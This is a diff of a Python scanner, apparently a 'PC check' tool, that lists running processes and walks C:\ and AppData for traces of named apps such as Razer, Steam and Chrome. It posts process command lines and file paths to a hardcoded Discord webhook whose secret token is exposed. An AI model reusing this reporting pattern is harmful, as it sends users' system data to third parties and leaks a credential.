@@ -1,105 +1,86 @@
 import os
 import requests
-import sys
-import psutil
-from pathlib import Path
+import ctypes
 from datetime import datetime
+import psutil
+import platform
 
-# Define webhooks
+# Webhooks
 WEBHOOKS = {
     'process_traces': 'https://canary.discord.com/api/webhooks/1279148419193114694/l4pr5CEMMlD4LDsZ9_plYFSfTgWCVvWqXCN9Gri6XVq8bRL55GZtgNZXGOU1TrY34SCV',
 }
 
-# Define processes to look for
-PROCESSES_TO_FIND = [
-    'LGHUB',
-    'TikTokLIVEStudio',
-    'voicemeeterpro',
-    'grave',
-    'RazerCortex',
-    'RazerSynapse',
-    'spotify',
-    'steam',
-    'chrome',
+# Directories to scan
+DIRECTORIES_TO_SCAN = [
+    "C:\\",
+    "C:\\Users\\%USERNAME%\\AppData\\Local",
+    "C:\\Users\\%USERNAME%\\AppData\\Roaming"
 ]
 
-def send_webhook(webhook_url, content):
+# Target processes
+TARGET_PROCESSES = [
+    "LGHUB", "TikTokLIVEStudio", "voicemeeterpro", "grave",
+    "RazerCortex", "RazerSynapse", "spotify", "steam", "chrome"
+]
+
+def send_webhook_message(webhook_url, message):
     try:
-        response = requests.post(webhook_url, json={'content': content})
+        response = requests.post(webhook_url, json={"content": message})
         response.raise_for_status()
     except requests.exceptions.RequestException as e:
         print(f"Failed to send webhook: {e}")
 
-def scan_directory(directory, trace_file):
-    results = []
+def scan_for_processes():
+    found_processes = []
+    for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'username']):
+        try:
+            if proc.info['name'] in TARGET_PROCESSES:
+                found_processes.append(proc.info)
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            pass
+    return found_processes
+
+def scan_directory(directory):
+    found_files = []
     for root, dirs, files in os.walk(directory):
         for file in files:
-            file_path = os.path.join(root, file)
-            if any(proc.lower() in file.lower() for proc in PROCESSES_TO_FIND):
-                results.append(f"Found trace: {file_path}")
-    if results:
-        with open(trace_file, 'a') as f:
-            for result in results:
-                f.write(result + '\n')
-    return results
-
-def check_processes():
-    results = []
-    for proc in psutil.process_iter(['pid', 'name', 'username', 'exe']):
-        try:
-            if proc.info['name'] in PROCESSES_TO_FIND:
-                result = f"Process: {proc.info['name']} | PID: {proc.info['pid']} | Path: {proc.info['exe']} | User: {proc.info['username']}"
-                if proc.info['username'] in ['SYSTEM', 'admin']:  # Check if admin
-                    result += " | Admin"
-                results.append(result)
-        except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
-            continue
-    return results
+            filepath = os.path.join(root, file)
+            if any(target in filepath for target in TARGET_PROCESSES):
+                found_files.append(filepath)
+    return found_files
 
 def main():
-    if len(sys.argv) < 2:
-        print("No option provided.")
-        return
+    # Clear previous results
+    if os.path.exists("results.txt"):
+        os.remove("results.txt")
 
-    option = sys.argv[1]
-    if option != '--scan-directory':
-        print("Invalid option.")
-        return
+    # Scan for processes
+    found_processes = scan_for_processes()
+    if found_processes:
+        for proc in found_processes:
+            message = f"Found process: {proc['name']} (PID: {proc['pid']}, Command Line: {' '.join(proc['cmdline'])})"
+            print(f"\033[33m{message}\033[0m")  # Yellow text for processes
+            send_webhook_message(WEBHOOKS['process_traces'], message)
+    else:
+        print("\033[34mNo target processes found.\033[0m")  # Blue text for no processes found
 
-    output_folder = os.path.join(Path.home(), 'AppData', 'MyPythonScript')
-    Path(output_folder).mkdir(parents=True, exist_ok=True)
-    results_log_path = os.path.join(output_folder, 'results.txt')
-    error_log_path = os.path.join(output_folder, 'error_log.txt')
-
-    directories_to_scan = [
-        "C:\\",  # Root directory
-        "C:\\Users\\%USERNAME%\\AppData\\Local",  # AppData Local
-        "C:\\Users\\%USERNAME%\\AppData\\Roaming"  # AppData Roaming
-        # Add more directories as needed
-    ]
-
-    try:
-        # Check processes
-        process_results = check_processes()
-        if process_results:
-            print("\033[93mScanning active processes...\033[0m")  # Yellow
-            send_webhook(WEBHOOKS['process_traces'], "\n".join(process_results))
+    # Scan directories
+    for directory in DIRECTORIES_TO_SCAN:
+        directory = directory.replace("%USERNAME%", os.getlogin())  # Replace %USERNAME% with actual username
+        print(f"Scanning through folder {directory}...")
+        found_files = scan_directory(directory)
+        if found_files:
+            message = f"Found traces in {directory} - See results.txt for details."
+            print(f"\033[31m{message}\033[0m")  # Red text for found traces
+            send_webhook_message(WEBHOOKS['process_traces'], message)
+            with open("results.txt", "a") as file:
+                for trace in found_files:
+                    file.write(f"Trace found: {trace}\n")
         else:
-            print("\033[92mNo target processes found.\033[0m")  # Green
+            print(f"\033[32mScanning through folder {directory} - Clear\033[0m")  # Green text for clear
 
-        for directory in directories_to_scan:
-            directory = directory.replace('%USERNAME%', os.getlogin())
-            print(f"\033[96mScanning through folder {directory}\033[0m")  # Cyan
-            results = scan_directory(directory, results_log_path)
-            if results:
-                print(f"\033[91mFound traces in {directory} - See results.txt for details.\033[0m")  # Red
-                send_webhook(WEBHOOKS['process_traces'], "\n".join(results))
-            else:
-                print(f"\033[92mFolder {directory} is clear.\033[0m")  # Green
-    except Exception as e:
-        with open(error_log_path, 'a') as f:
-            f.write(f"Error: {e}\n")
-        print(f"\033[91mAn error occurred. Check the error log for details.\033[0m")  # Red
+    print("Scanning complete.")
+    send_webhook_message(WEBHOOKS['process_traces'], "Scanning complete. Check results.txt for details.")
 
 if __name__ == "__main__":
     main()
